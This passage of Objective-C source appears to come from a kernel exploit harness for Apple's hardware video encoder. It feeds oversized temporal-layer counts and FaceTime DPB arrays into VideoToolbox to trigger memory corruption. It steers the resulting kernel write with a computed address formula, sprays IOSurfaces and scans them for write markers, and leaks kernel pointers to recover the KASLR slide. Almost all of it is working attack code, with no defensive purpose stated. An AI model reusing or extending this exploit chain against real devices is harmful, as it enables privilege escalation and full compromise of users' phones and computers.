            OSStatus setRatios = VTSessionSetProperty(sX, CFSTR("TemporalLayerFrameRateRatios"),
                                                      (__bridge CFTypeRef)ratios);
            int postSmash = -1;
            CFNumberRef rbX = NULL;
            if (VTSessionCopyProperty(sX, CFSTR("NumberOfTemporalLayers"), NULL, &rbX) == noErr && rbX) {
                CFNumberGetValue(rbX, kCFNumberIntType, &postSmash); CFRelease(rbX);
            }
            [report appendFormat:@"  path-i post-set=%d ratios=%d readback=%d %s\n",
             (int)setSmash, (int)setRatios, postSmash,
             (postSmash == smash) ? "UNCLAMPED" : "CLAMPED"];
            // Path (ii): NTL in frameProperties of the next frame
            NSDictionary *smashProps = @{ @"NumberOfTemporalLayers": @16000 };
            OSStatus encSmash = -1;
            if (pbX) {
                encSmash = VTCompressionSessionEncodeFrame(sX, pbX, CMTimeMake(1, 30), kCMTimeInvalid,
                                                           (__bridge CFDictionaryRef)smashProps, NULL, NULL);
                KPH9Drain(sX, nil, 0, 30);
            }
            [report appendFormat:@"  path-ii frameProps NTL=16000 encode -> %d\n", (int)encSmash];
            if (pbX) CVPixelBufferRelease(pbX);
            VTCompressionSessionInvalidate(sX);
            CFRelease(sX);
        }
    }

    // === encSpec EncoderUsage sweep 0..31 at ntl=8 (analyst step 3) ===
    [self journal:@"encSpec EncoderUsage sweep"];
    [report appendString:@"\n--- encSpec EncoderUsage sweep 0..31 (ntl=8) ---\n"];
    int usageVals[] = { 0, 1, 2, 4, 8, 16, 31 };
    for (int ui = 0; ui < 7; ui++) {
        int usage = usageVals[ui];
        NSMutableDictionary *specU = [NSMutableDictionary dictionary];
        specU[@"EncoderUsage"] = @(usage);
        specU[@"NumberOfTemporalLayers"] = @8;
        specU[@"AllowTemporalCompression"] = @YES;
        VTCompressionSessionRef sU = NULL;
        if (VTCompressionSessionCreate(kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_HEVC,
                                       (__bridge CFDictionaryRef)specU, NULL, NULL, NULL, NULL, &sU) != noErr || !sU) {
            continue;
        }
        VTSessionSetProperty(sU, CFSTR("AllowTemporalCompression"), kCFBooleanTrue);
        VTSessionSetProperty(sU, CFSTR("RealTime"), kCFBooleanTrue);
        VTSessionSetProperty(sU, kVTCompressionPropertyKey_ExpectedFrameRate, (__bridge CFNumberRef)@120);
        VTSessionSetProperty(sU, kVTCompressionPropertyKey_AverageBitRate, (__bridge CFNumberRef)@4000000);
        VTSessionSetProperty(sU, kVTCompressionPropertyKey_BaseLayerFrameRate, (__bridge CFNumberRef)@15);
        VTCompressionSessionPrepareToEncodeFrames(sU);
        int postU = -1;
        CFNumberRef rbU = NULL;
        if (VTSessionCopyProperty(sU, CFSTR("NumberOfTemporalLayers"), NULL, &rbU) == noErr && rbU) {
            CFNumberGetValue(rbU, kCFNumberIntType, &postU); CFRelease(rbU);
        }
        if (postU != 1) {
            [report appendFormat:@"  usage=%-2d POST=%d %s\n", usage, postU,
             (postU >= 8) ? "UNCLAMPED" : "PARTIAL"];
        }
        VTCompressionSessionInvalidate(sU);
        CFRelease(sU);
    }
    [report appendString:@"  (rows with POST=1 omitted)\n"];

    // === AVE27 stage13: NTL sweep on the proven trigger config (ollie) ===
    // Confirmed trigger (KPAuditAVE112705Module): 1280x720 + 420YpCbCr8BiPlanarVideoRange.
    // Steered NTL: x0 = ((NTL-16463) << 32) | 0x59
    //   NTL 16431..16446 -> x0 in 0xffffffe0..ef 00000059 (kheap family A)
    //   NTL 15967..16270 -> x0 in 0xfffffe10..3f 00000059 (kheap family B)
    // Big IOSurface spray first so the target page is mapped and ours; then scan
    // every surface for the x0 marker written by stp x0,x0,[x0] (+0x59 pattern).
    [report appendString:@"\n--- AVE27 stage13: NTL sweep (1280x720 420v, steered + spray) ---\n"];
    [report appendString:@"Trigger: EncoderUsage=1 NTL=N (no RCMode; 20 fails -12900 on A17 Pro)\n"];
    [report appendString:@"x0 = ((NTL-16463) << 32) | 0x59; marker scan = x0 at off, 0 at off+0x18\n"];

    void *isLib2 = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    typedef void *(*ISCreateFn2)(CFDictionaryRef);
    typedef int (*ISLockFn2)(void *, uint32_t, uint32_t *);
    typedef int (*ISUnlockFn2)(void *, uint32_t, uint32_t *);
    typedef void *(*ISGetBaseFn2)(void *);
    typedef size_t (*ISGetSizeFn2)(void *);
    ISCreateFn2 isCreate2 = isLib2 ? (ISCreateFn2)dlsym(isLib2, "IOSurfaceCreate") : NULL;
    ISLockFn2 isLock2 = isLib2 ? (ISLockFn2)dlsym(isLib2, "IOSurfaceLock") : NULL;
    ISUnlockFn2 isUnlock2 = isLib2 ? (ISUnlockFn2)dlsym(isLib2, "IOSurfaceUnlock") : NULL;
    ISGetBaseFn2 isGetBase2 = isLib2 ? (ISGetBaseFn2)dlsym(isLib2, "IOSurfaceGetBaseAddress") : NULL;
    ISGetSizeFn2 isGetSize2 = isLib2 ? (ISGetSizeFn2)dlsym(isLib2, "IOSurfaceGetAllocSize") : NULL;

    // stage9 recipe + analyst creation-spec finding: NTL rides in
    // encoderSpecification at Create and the unclamp COMMITS at Prepare
    // (readback PRE=1, POST=N). Pass 0 = RCMode=20 + rate companions,
    // pass 1 = control without RCMode.
    // Allocate shared IOSurface spray pool ONCE before the 2-pass sweep so we
    // do not churn 3.5 GB of kernel wired/surface mappings across 18 rows.
    CFMutableArrayRef sharedSurfArray = NULL;
    if (isCreate2 && isLock2 && isUnlock2 && isGetBase2 && isGetSize2) {
        sharedSurfArray = CFArrayCreateMutable(kCFAllocatorDefault, 0, &kCFTypeArrayCallBacks);
        NSDictionary *props = @{
            @"IOSurfaceWidth": @1024,
            @"IOSurfaceHeight": @512,
            @"IOSurfaceBytesPerElement": @4,
            @"IOSurfacePixelFormat": @0x42475241,
        };
        for (int s = 0; s < 16; s++) {
            void *surf = isCreate2((__bridge CFDictionaryRef)props);
            if (surf) {
                uint32_t seed = 0;
                if (isLock2(surf, 0, &seed) == KERN_SUCCESS) {
                    uint8_t *base = (uint8_t *)isGetBase2(surf);
                    size_t sz = isGetSize2(surf);
                    if (base && sz > 0) {
                        for (size_t pOff = 0; pOff < sz; pOff += 0x4000) base[pOff] = 0;
                    }
                    isUnlock2(surf, 0, &seed);
                }
                CFArrayAppendValue(sharedSurfArray, surf);
                CFRelease(surf);
            }
        }
    }

    int ntlVals[] = { 1, 100, 15967, 16000, 16014, 16115, 16223, 16270, 16431, 16438, 16446, 16447, 16462 };
    for (int pass = 0; pass < 2; pass++) {
    BOOL useRC = (pass == 0);
    for (int i = 0; i < 13; i++) {
        int ntl = ntlVals[i];
        uint64_t x0 = ((uint64_t)(int32_t)(ntl - 16463) << 32) | 0x59ULL;
        int64_t kOff = 16463 - (int64_t)ntl;
        OSStatus rcSt = 0;

        // Use shared spray pool for steered kheap windows (k=17..496).
        CFMutableArrayRef surfArray = (kOff >= 17 && kOff <= 496) ? sharedSurfArray : NULL;
        [report appendFormat:@"  [%@] NTL=%-5d x0=0x%016llx spray=%ld rcSet=%d\n",
         useRC ? @"RC20" : @"noRC", ntl, x0, surfArray ? (long)CFArrayGetCount(surfArray) : 0L, (int)rcSt];

        VTCompressionSessionRef s2 = NULL;
        NSDictionary *spec2 = @{
            @"EncoderUsage": @1,
            @"NumberOfTemporalLayers": @(ntl),
            @"AllowTemporalCompression": @YES,
        };
        OSStatus st2 = VTCompressionSessionCreate(
            kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_HEVC,
            (__bridge CFDictionaryRef)spec2, NULL, NULL, NULL, NULL, &s2);
        if (st2 != noErr || !s2) {
            [report appendFormat:@"  NTL=%d session_create=%d FAILED\n", ntl, (int)st2];
            continue;
        }
        CFNumberRef n;
        int usage = 1;
        n = CFNumberCreate(NULL, kCFNumberIntType, &usage);
        VTSessionSetProperty(s2, CFSTR("EncoderUsage"), n);
        CFRelease(n);
        if (useRC) {
            // ollie: AllowTemporalCompression + RealTime are the master switches
            // for NTL>1 on H16 â€” without them VT clamps NTL to 1 even with
            // RCMode=20. Rates must be set BEFORE NTL.
            OSStatus atc = VTSessionSetProperty(s2, CFSTR("AllowTemporalCompression"), kCFBooleanTrue);
            OSStatus rt = VTSessionSetProperty(s2, CFSTR("RealTime"), kCFBooleanTrue);
            VTSessionSetProperty(s2, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanTrue);
            double rate = 30.0;
            n = CFNumberCreate(NULL, kCFNumberDoubleType, &rate);
            VTSessionSetProperty(s2, CFSTR("BaseLayerFrameRate"), n); CFRelease(n);
            n = CFNumberCreate(NULL, kCFNumberDoubleType, &rate);
            VTSessionSetProperty(s2, CFSTR("ExpectedFrameRate"), n); CFRelease(n);
            int rc = 20;
            n = CFNumberCreate(NULL, kCFNumberIntType, &rc);
            rcSt = VTSessionSetProperty(s2, CFSTR("RCMode"), n);
            CFRelease(n);
            // Read back gate VALUES â€” status 0 means "set ok", not "value 0".
            int atcVal = -1, rcVal = -1;
            CFTypeRef gv = NULL;
            if (VTSessionCopyProperty(s2, CFSTR("AllowTemporalCompression"), NULL, &gv) == noErr && gv) {
                if (CFGetTypeID(gv) == CFBooleanGetTypeID()) atcVal = CFBooleanGetValue((CFBooleanRef)gv);
                CFRelease(gv);
            }
            gv = NULL;
            if (VTSessionCopyProperty(s2, CFSTR("RCMode"), NULL, &gv) == noErr && gv) {
                if (CFGetTypeID(gv) == CFNumberGetTypeID()) CFNumberGetValue((CFNumberRef)gv, kCFNumberIntType, &rcVal);
                CFRelease(gv);
            }
            [report appendFormat:@"    temporal gate: setATC=%d setRT=%d valueATC=%d valueRC=%d\n",
             (int)atc, (int)rt, atcVal, rcVal];
        }
        n = CFNumberCreate(NULL, kCFNumberIntType, &ntl);
        OSStatus setSt = VTSessionSetProperty(s2, CFSTR("NumberOfTemporalLayers"), n);
        CFRelease(n);
        // Analyst 212023: the unclamp COMMITS at PrepareToEncodeFrames - readback
        // before prepare shows the wrapper's clamped 1, after prepare the real N.
        OSStatus prepSt = VTCompressionSessionPrepareToEncodeFrames(s2);
        int rb = 0;
        CFNumberRef rbn = NULL;
        VTSessionCopyProperty(s2, CFSTR("NumberOfTemporalLayers"), NULL, &rbn);
        if (rbn) { CFNumberGetValue(rbn, kCFNumberIntType, &rb); CFRelease(rbn); }
        CVPixelBufferRef pb2 = NULL;
        CVPixelBufferCreate(kCFAllocatorDefault, 1280, 720,
                            kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, NULL, &pb2);
        if (!pb2) {
            [report appendFormat:@"  NTL=%d PIXELBUFFER_FAILED\n", ntl];
            VTCompressionSessionInvalidate(s2);
            CFRelease(s2);
            continue;
        }
        CVPixelBufferLockBaseAddress(pb2, 0);
        size_t ySz = CVPixelBufferGetBytesPerRowOfPlane(pb2, 0) * 720;
        memset(CVPixelBufferGetBaseAddressOfPlane(pb2, 0), 0x40, ySz);
        size_t uvSz = CVPixelBufferGetBytesPerRowOfPlane(pb2, 1) * 360;
        memset(CVPixelBufferGetBaseAddressOfPlane(pb2, 1), 0x80, uvSz);
        CVPixelBufferUnlockBaseAddress(pb2, 0);
        VTEncodeInfoFlags f2 = 0;
        st2 = VTCompressionSessionEncodeFrame(s2, pb2, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, &f2);
        [report appendFormat:@"  [%@] NTL=%d set=%d prepare=%d readback_POST=%d encode=%d %s\n",
         useRC ? @"RC20" : @"noRC", ntl, (int)setSt, (int)prepSt, rb, (int)st2,
                (rb == ntl) ? ((st2 == noErr) ? "ARMED" : "FAILED") : "RAN_READBACK_MISMATCH"];
        CVPixelBufferRelease(pb2);
        VTCompressionSessionInvalidate(s2);
        CFRelease(s2);

        // Marker scan: check page-offset +0x59 / +0x58 and 64B stride in first 64KB
        if (surfArray) {
            long totalHits = 0;
            CFIndex scount = CFArrayGetCount(surfArray);
            for (CFIndex si = 0; si < scount; si++) {
                void *surf = (void *)CFArrayGetValueAtIndex(surfArray, si);
                uint32_t seed = 0;
                if (isLock2(surf, 0, &seed) != KERN_SUCCESS) continue;
                uint8_t *base = (uint8_t *)isGetBase2(surf);
                size_t sz = isGetSize2(surf);
                if (base && sz >= 0x4000) {
                    for (size_t pageOff = 0; pageOff + 0x80 <= sz; pageOff += 0x4000) {
                        uint64_t qAligned = *(uint64_t *)(base + pageOff + 0x58);
                        uint64_t qUnaligned = 0;
                        memcpy(&qUnaligned, base + pageOff + 0x59, sizeof(uint64_t));
                        if (qAligned == x0 || qUnaligned == x0) {
                            size_t hitOff = (qAligned == x0) ? (pageOff + 0x58) : (pageOff + 0x59);
                            uint64_t q2 = 0;
                            uint32_t z = 0;
                            memcpy(&q2, base + hitOff + 8, sizeof(uint64_t));
                            memcpy(&z, base + hitOff + 0x18, sizeof(uint32_t));
                            [report appendFormat:@"    MARKER HIT surf=%ld off=0x%zx q2=0x%llx z=0x%x\n",
                             (long)si, hitOff, q2, z];
                            totalHits++;
                            if (totalHits >= 4) break;
                        }
                    }
                }
                isUnlock2(surf, 0, &seed);
                if (totalHits >= 4) break;
            }
            [report appendFormat:@"    marker scan: %ld hit(s) in %ld surfaces\n",
             totalHits, (long)scount];
        }
    }
    }
    if (sharedSurfArray) CFRelease(sharedSurfArray);

    // === B-frame DPB overflow ===
    [report appendString:@"\n--- B-frame DPB overflow ---\n"];
    VTCompressionSessionRef s3 = NULL;
    OSStatus st3 = VTCompressionSessionCreate(
        kCFAllocatorDefault, 640, 480, kCMVideoCodecType_HEVC,
        NULL, NULL, NULL, NULL, NULL, &s3);
    if (st3 == noErr && s3) {
        VTSessionSetProperty(s3, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanTrue);
        int gop = 30, fps = 30;
        CFNumberRef n3;
        n3 = CFNumberCreate(NULL, kCFNumberIntType, &gop);
        VTSessionSetProperty(s3, kVTCompressionPropertyKey_MaxKeyFrameInterval, n3);
        CFRelease(n3);
        n3 = CFNumberCreate(NULL, kCFNumberIntType, &fps);
        VTSessionSetProperty(s3, kVTCompressionPropertyKey_ExpectedFrameRate, n3);
        CFRelease(n3);
        st3 = VTCompressionSessionPrepareToEncodeFrames(s3);
        if (st3 == noErr) {
            int enc = 0;
            for (int i = 0; i < 8; i++) {
                CVPixelBufferRef pb3 = NULL;
                CVPixelBufferCreate(kCFAllocatorDefault, 640, 480, kCVPixelFormatType_32BGRA, NULL, &pb3);
                if (!pb3) continue;
                CVPixelBufferLockBaseAddress(pb3, 0);
                memset(CVPixelBufferGetBaseAddress(pb3), 0x80, CVPixelBufferGetDataSize(pb3));
                CVPixelBufferUnlockBaseAddress(pb3, 0);
                VTEncodeInfoFlags f3 = 0;
                st3 = VTCompressionSessionEncodeFrame(s3, pb3, CMTimeMake(i, fps), kCMTimeInvalid, NULL, NULL, &f3);
                if (st3 == noErr) enc++;
                CVPixelBufferRelease(pb3);
            }
            [report appendFormat:@"  B-frame encode: %d/8 frames\n", enc];
        }
        KPH9Drain(s3, nil, 0, 30);
        VTCompressionSessionInvalidate(s3);
        CFRelease(s3);
    }

    // === KASLR scan ===
    [self journal:@"KASLR scan"];
    [report appendString:@"\n--- KASLR scan ---\n"];
    uint64_t kStaticBases[] = {
        0xfffffff007004000ULL, // __TEXT
        0xfffffff00700c000ULL, // __PRELINK_TEXT
        0xfffffff0082fc000ULL, // __TEXT_EXEC
        0xfffffff00b284000ULL, // __DATA
    };
    uint32_t slideCandidates[64] = {0};
    int slideCounts[64] = {0};
    int candidateCount = 0;
    int totalKptrs = 0;
    vm_address_t kaddr = 0;
    vm_size_t ksize = 0;
    uint32_t kdepth = 0;
    vm_region_submap_info_data_64_t kinfo;
    mach_msg_type_number_t kcount = VM_REGION_SUBMAP_INFO_COUNT_64;
    uint64_t kPageBuf[512];
    for (int iter = 0; iter < 256; iter++) {
        kcount = VM_REGION_SUBMAP_INFO_COUNT_64;
        kern_return_t kr = vm_region_recurse_64(mach_task_self(), &kaddr, &ksize, &kdepth,
                                                 (vm_region_recurse_info_t)&kinfo, &kcount);
        if (kr != KERN_SUCCESS || ksize == 0) break;
        if (kinfo.is_submap) { kdepth++; continue; }
        if ((kinfo.protection & (VM_PROT_READ | VM_PROT_WRITE)) == (VM_PROT_READ | VM_PROT_WRITE) &&
            ksize <= 16 * 1024 * 1024 &&
            !KPVMShouldSkipRegion(&kinfo, kaddr, ksize, &totalKptrs, NULL, NULL, 0)) {
            vm_size_t maxBytes = (ksize < 32768) ? ksize : 32768;
            for (vm_size_t off = 0; off + sizeof(kPageBuf) <= maxBytes; off += sizeof(kPageBuf)) {
                vm_size_t outSz = 0;
                if (vm_read_overwrite(mach_task_self(), kaddr + off, sizeof(kPageBuf),
                                      (vm_address_t)kPageBuf, &outSz) != KERN_SUCCESS ||
                    outSz < sizeof(uint64_t)) break;
                size_t words = outSz / sizeof(uint64_t);
                for (size_t i = 0; i < words; i++) {
                    uint64_t v = kPageBuf[i];
                    if (KPIsKernelPointerCandidate(v) && !KPIsKnownDiagnosticConstant(v)) {
                        totalKptrs++;
                        uint64_t untagged = 0;
                        if (!KPIsPlausibleKernelText(v, &untagged)) continue;
                        for (int b = 0; b < 4; b++) {
                            if (untagged <= kStaticBases[b]) continue;
                            uint64_t slide = untagged - kStaticBases[b];
                            if ((slide & 0x3FFF) == 0 && slide < (1024ULL << 20)) {
                                int found = 0;
                                for (int c = 0; c < candidateCount; c++) {
                                    if (slideCandidates[c] == (uint32_t)slide) {
                                        slideCounts[c]++;
                                        found = 1;
                                        break;
                                    }
                                }
                                if (!found && candidateCount < 64) {
                                    slideCandidates[candidateCount] = (uint32_t)slide;
                                    slideCounts[candidateCount] = 1;
                                    candidateCount++;
                                }
                            }
                        }
                    }
                }
            }
        }
        if (kaddr + ksize <= kaddr) break;
        kaddr += ksize;
    }
    [report appendFormat:@"  kernel pointers: %d\n", totalKptrs];
    int bestIdx = -1, bestCnt = 0;
    for (int c = 0; c < candidateCount; c++) {
        if (slideCounts[c] > bestCnt) { bestCnt = slideCounts[c]; bestIdx = c; }
    }
    if (bestIdx >= 0) {
        uint32_t slide = slideCandidates[bestIdx];
        uint64_t kbase = 0xfffffff007004000ULL + slide;
        [report appendFormat:@"  KASLR slide = 0x%x (hits=%d)\n", slide, bestCnt];
        [report appendFormat:@"  Kernel base = 0x%llx\n", kbase];

        // Compute NTL values that steer write into kernel range
        [report appendString:@"\n--- NTL steering (kernel range writes) ---\n"];
        [report appendString:@"x0 = ((NTL-16463) << 32) | 0x59\n"];
        [report appendString:@"NTL=1 -> 0xffffbfb200000059; NTL=16447 -> 0xfffffff000000059\n"];
        // NTL=1:     (-16462 << 32) | 0x59 = 0xffffbfb200000059
        // NTL=16447: (-16 << 32)    | 0x59 = 0xfffffff000000059
        int steerVals[] = { 1, 2, 3, 100, 1000, 8000, 16000, 16447, 16455, 16462 };
        for (int i = 0; i < 10; i++) {
            int ntl = steerVals[i];
            int64_t idx = (int64_t)ntl - 16463;
            uint64_t x0 = ((uint64_t)idx << 32) | 0x59;
            [report appendFormat:@"  NTL=%-5d -> x0=0x%016llx\n", ntl, x0];
        }
    }

    // === IOSurface kernel write detection (dlopen pattern) ===
    [report appendString:@"\n--- IOSurface kernel write detection ---\n"];
    void *isLib = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (isLib) {
        typedef void *(*ISCreateFn)(CFDictionaryRef);
        typedef int (*ISLockFn)(void *, uint32_t, void *);
        typedef int (*ISUnlockFn)(void *, uint32_t, void *);
        typedef void *(*ISGetBaseFn)(void *);
        typedef size_t (*ISGetSizeFn)(void *);
        ISCreateFn isCreate = (ISCreateFn)dlsym(isLib, "IOSurfaceCreate");
        ISLockFn isLock = (ISLockFn)dlsym(isLib, "IOSurfaceLock");
        ISUnlockFn isUnlock = (ISUnlockFn)dlsym(isLib, "IOSurfaceUnlock");
        ISGetBaseFn isGetBase = (ISGetBaseFn)dlsym(isLib, "IOSurfaceGetBaseAddress");
        ISGetSizeFn isGetSize = (ISGetSizeFn)dlsym(isLib, "IOSurfaceGetAllocSize");
        if (isCreate && isLock && isUnlock && isGetBase) {
            NSDictionary *surfProps = @{
                @"IOSurfaceWidth": @64,
                @"IOSurfaceHeight": @64,
                @"IOSurfaceBytesPerElement": @4,
                @"IOSurfacePixelFormat": @0x42475241,
            };
            void *surf = isCreate((__bridge CFDictionaryRef)surfProps);
            if (surf) {
                isLock(surf, 0, NULL);
                void *surfBase = isGetBase(surf);
                size_t surfSize = isGetSize ? isGetSize(surf) : 64*64*4;
                memset(surfBase, 0x41, surfSize);
                uint32_t *p32 = (uint32_t *)surfBase;
                for (int i = 0; i < 16; i++) p32[i] = 0xDEAD0000 + i;
                isUnlock(surf, 0, NULL);
                [report appendFormat:@"  IOSurface: %zu bytes at %p\n", surfSize, surfBase];
                // Read back
                isLock(surf, 0, NULL);
                uint32_t *check = (uint32_t *)isGetBase(surf);
                int kw = 0;
                for (int i = 0; i < 16; i++) {
                    if (check[i] != 0xDEAD0000 + i) {
                        [report appendFormat:@"  CHANGED [%d]: 0x%08x\n", i, check[i]];
                        kw++;
                    }
                }
                isUnlock(surf, 0, NULL);
                [report appendFormat:@"  kernel writes detected: %d\n", kw];
            } else {
                [report appendString:@"  IOSurfaceCreate returned NULL\n"];
            }
        } else {
            [report appendFormat:@"  dlsym failed: create=%p lock=%p\n", isCreate, isLock];
        }
    } else {
        [report appendString:@"  dlopen IOSurface failed\n"];
    }

    // === UserDPB overflow trigger (AVE27 stage12) ===
    [report appendString:@"\n--- UserDPB overflow trigger ---\n"];

    VTCompressionSessionRef sDPB = NULL;
    // Analyst 212023: the encSpec binding is what opens the door — the old
    // setter-only path rejected every DPB element with -12912.
    NSDictionary *dpbSpec = @{
        @"EncoderUsage": @1,
        @"EnableUserRefForFacetime": @YES,
    };
    OSStatus stDPB = VTCompressionSessionCreate(
        kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_HEVC,
        (__bridge CFDictionaryRef)dpbSpec, NULL, NULL, NULL, NULL, &sDPB);
    if (stDPB != noErr || !sDPB) {
        [report appendFormat:@"  session create: %d\n", (int)stDPB];
    } else {
        // EncoderUsage=1
        int usage = 1;
        CFNumberRef nu = CFNumberCreate(NULL, kCFNumberIntType, &usage);
        VTSessionSetProperty(sDPB, CFSTR("EncoderUsage"), nu);
        CFRelease(nu);

        // EnableUserRefForFacetime=BOOLEAN true (+ RPS gate, ollie)
        OSStatus stRef = VTSessionSetProperty(sDPB, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
        [report appendFormat:@"  EnableUserRefForFacetime=YES -> %d\n", (int)stRef];
        OSStatus stRef2 = VTSessionSetProperty(sDPB, CFSTR("EnableUserRPSForFaceTime"), kCFBooleanTrue);
        [report appendFormat:@"  EnableUserRPSForFaceTime=YES -> %d\n", (int)stRef2];

        // Encode FIRST frame to initialize encoder (AVE27 stage12 order)
        VTSessionSetProperty(sDPB, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanTrue);
        OSStatus stPrep = VTCompressionSessionPrepareToEncodeFrames(sDPB);
        [report appendFormat:@"  prepare -> %d\n", (int)stPrep];

        if (stPrep == noErr) {
            // First encode (initialize)
            CVPixelBufferRef pb0 = NULL;
            CVPixelBufferCreate(kCFAllocatorDefault, 1280, 720,
                                kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, NULL, &pb0);
            if (pb0) {
                CVPixelBufferLockBaseAddress(pb0, 0);
                memset(CVPixelBufferGetBaseAddressOfPlane(pb0, 0), 0x40,
                       CVPixelBufferGetBytesPerRowOfPlane(pb0, 0) * 720);
                memset(CVPixelBufferGetBaseAddressOfPlane(pb0, 1), 0x80,
                       CVPixelBufferGetBytesPerRowOfPlane(pb0, 1) * 360);
                CVPixelBufferUnlockBaseAddress(pb0, 0);
                VTEncodeInfoFlags f0 = 0;
                OSStatus stE0 = VTCompressionSessionEncodeFrame(sDPB, pb0, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, &f0);
                [report appendFormat:@"  encode[0] (init) -> %d\n", (int)stE0];
                CVPixelBufferRelease(pb0);
            }

            // NOW set UserDPBFramesForFaceTime=24 (after init).
            // Per videocodecd-2026-11-08-224808.ips: NSDictionary elements cause
            // -[__NSDictionaryI _getValue:forType:] SIGABRT in videocodecd at
            // AVE_Prop_HEVC_SetUserDPBFramesForFaceTime+200. Use NSNumber elements.
            [self journal:@"UserDPB overflow trigger"];
            NSMutableArray *dpbArray = [NSMutableArray arrayWithCapacity:24];
            for (int i = 0; i < 24; i++) {
                [dpbArray addObject:@(i)];
            }
            OSStatus stFrames = VTSessionSetProperty(sDPB, CFSTR("UserDPBFramesForFaceTime"),
                                                     (__bridge CFArrayRef)dpbArray);
            [report appendFormat:@"  UserDPBFramesForFaceTime=array[24] (after init) -> %d\n", (int)stFrames];

            // ollie: DPB slot threshold sweep like the OOL probe (borders 15/16/17)
            uint32_t dpbLastOK = 0, dpbFirstReject = 0;
            for (uint32_t n2 = 1; n2 <= 24; n2++) {
                NSMutableArray *arr = [NSMutableArray arrayWithCapacity:n2];
                for (uint32_t i2 = 0; i2 < n2; i2++) {
                    [arr addObject:@(i2)];
                }
                OSStatus stA = VTSessionSetProperty(sDPB, CFSTR("UserDPBFramesForFaceTime"),
                                                    (__bridge CFArrayRef)arr);
                if (stA == 0) {
                    dpbLastOK = n2;
                } else if (dpbFirstReject == 0) {
                    dpbFirstReject = n2;
                    break;
                }
            }
            [report appendFormat:@"  DPB array threshold: last_ok=%u first_rejection=%u\n",
             dpbLastOK, dpbFirstReject];

            // DPBRequirements
            NSMutableArray *dpbReq = [NSMutableArray array];
            for (int i = 0; i < 24; i++) [dpbReq addObject:@(i)];
            OSStatus stReq = VTSessionSetProperty(sDPB, CFSTR("DPBRequirements"), (__bridge CFArrayRef)dpbReq);
            [report appendFormat:@"  DPBRequirements(24) -> %d\n", (int)stReq];

            // Encode more frames
            for (int i = 1; i < 4; i++) {
                CVPixelBufferRef pbD = NULL;
                CVPixelBufferCreate(kCFAllocatorDefault, 1280, 720,
                                    kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, NULL, &pbD);
                if (!pbD) continue;
                CVPixelBufferLockBaseAddress(pbD, 0);
                memset(CVPixelBufferGetBaseAddressOfPlane(pbD, 0), 0x40,
                       CVPixelBufferGetBytesPerRowOfPlane(pbD, 0) * 720);
                memset(CVPixelBufferGetBaseAddressOfPlane(pbD, 1), 0x80,
                       CVPixelBufferGetBytesPerRowOfPlane(pbD, 1) * 360);
                CVPixelBufferUnlockBaseAddress(pbD, 0);
                VTEncodeInfoFlags fD = 0;
                OSStatus stE = VTCompressionSessionEncodeFrame(sDPB, pbD, CMTimeMake(i, 30), kCMTimeInvalid, NULL, NULL, &fD);
                [report appendFormat:@"  encode[%d] -> %d\n", i, (int)stE];
                CVPixelBufferRelease(pbD);
            }
        }

        // Readback (check type before converting!)
        CFTypeRef rb = NULL;
        VTSessionCopyProperty(sDPB, CFSTR("UserDPBFramesForFaceTime"), NULL, &rb);
        if (rb) {
            CFTypeID t = CFGetTypeID(rb);
            if (t == CFNumberGetTypeID()) {
                int v = 0;
                CFNumberGetValue((CFNumberRef)rb, kCFNumberIntType, &v);
                [report appendFormat:@"  readback UserDPBFramesForFaceTime=%d (number)\n", v];
            } else if (t == CFArrayGetTypeID()) {
                [report appendFormat:@"  readback UserDPBFramesForFaceTime=array(%ld)\n", (long)CFArrayGetCount((CFArrayRef)rb)];
            } else {
                [report appendFormat:@"  readback UserDPBFramesForFaceTime=type(%lu)\n", (unsigned long)t];
            }
            CFRelease(rb);
        }
        CFTypeRef rb2 = NULL;
        VTSessionCopyProperty(sDPB, CFSTR("EnableUserRefForFacetime"), NULL, &rb2);
        if (rb2) {
            CFTypeID t2 = CFGetTypeID(rb2);
            if (t2 == CFNumberGetTypeID()) {
                int v2 = 0;
                CFNumberGetValue((CFNumberRef)rb2, kCFNumberIntType, &v2);
                [report appendFormat:@"  readback EnableUserRefForFacetime=%d\n", v2];
            } else if (t2 == CFBooleanGetTypeID()) {
                [report appendFormat:@"  readback EnableUserRefForFacetime=%d (bool)\n", (int)CFBooleanGetValue((CFBooleanRef)rb2)];
            } else {
                [report appendFormat:@"  readback EnableUserRefForFacetime=type(%lu)\n", (unsigned long)t2];
            }
            CFRelease(rb2);
        }

        KPH9Drain(sDPB, nil, 0, 30);
        VTCompressionSessionInvalidate(sDPB);
        CFRelease(sDPB);
    }

    // === UserDPB element schema probe v2 (analyst 215726) ===
    // Cross Test A + Test B: EncoderUsage INSIDE encSpec is what kills the IDR
    // with -17691 (Test B), while Test A's setter-only setup encodes fine.
    // Session property path for the DPB array is dead (-12912) - the array must
    // ride in frameProperties of a P-frame AFTER a clean IDR filled the DPB.
    [report appendString:@"\n--- UserDPB element schema probe v2 (isolated session per row) ---\n"];
    {
        // Prologue on one session: the clean-IDR recipe proof.
        NSMutableArray *cbSink = [NSMutableArray array];
        NSDictionary *encSpec = @{ @"EnableUserRefForFacetime": @YES };
        VTCompressionSessionRef sS = NULL;
        OSStatus stS = VTCompressionSessionCreate(
            kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_HEVC,
            (__bridge CFDictionaryRef)encSpec, NULL, NULL,
            KPH9AttsCB, (__bridge void *)cbSink, &sS);
        [report appendFormat:@"create with encSpec(EnableUserRef only) -> %d\n", (int)stS];
        if (stS == noErr && sS) {
            VTSessionSetProperty(sS, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
            VTSessionSetProperty(sS, CFSTR("AllocateRVRABuffers"), kCFBooleanTrue);
            VTCompressionSessionPrepareToEncodeFrames(sS);
            CVPixelBufferRef pbS = NULL;
            CVPixelBufferCreate(kCFAllocatorDefault, 1280, 720,
